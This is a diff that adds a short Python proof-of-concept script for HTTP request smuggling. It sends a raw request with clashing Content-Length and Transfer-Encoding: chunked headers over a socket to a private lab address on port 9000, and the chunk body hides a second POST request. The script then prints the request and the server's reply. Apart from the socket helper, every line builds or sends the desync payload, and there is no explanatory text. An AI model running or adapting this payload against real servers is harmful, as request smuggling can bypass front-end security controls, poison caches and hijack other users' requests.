@@ -1,0 +1,34 @@
+import socket
+
+def send_payload(data):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("192.168.44.129", 9000))
+    s.send(data)
+
+    data = s.recv(10240)
+    s.close()
+    return data
+
+
+second_packet = b"POST / HTTP/1.1\r\n"
+second_packet += b"Host: 192.168.44.129\r\n"
+second_packet += b"Content-Length: 300\r\n"
+second_packet += b"Content-Type: application/x-www-form-urlencoded\r\n"
+second_packet += b"\r\n"
+second_packet += b"x=1\r\n"
+
+packet = b"GET / HTTP/1.1\r\n"
+packet += b"Host: 192.168.44.129\r\n"
+packet += b"Content-Length: 4\r\n"
+packet += b"Transfer-Encoding: chunked\r\n"
+packet += b"\r\n"
+packet += "{:x}\r\n".format(len(second_packet)).encode()
+packet += second_packet
+packet += b"\r\n"
+packet += b"0\r\n"
+packet += b"\r\n"
+
+print("=======[Request]========")
+print(packet.decode())
+print("=======[Request]========")
+print(send_payload(packet).decode())
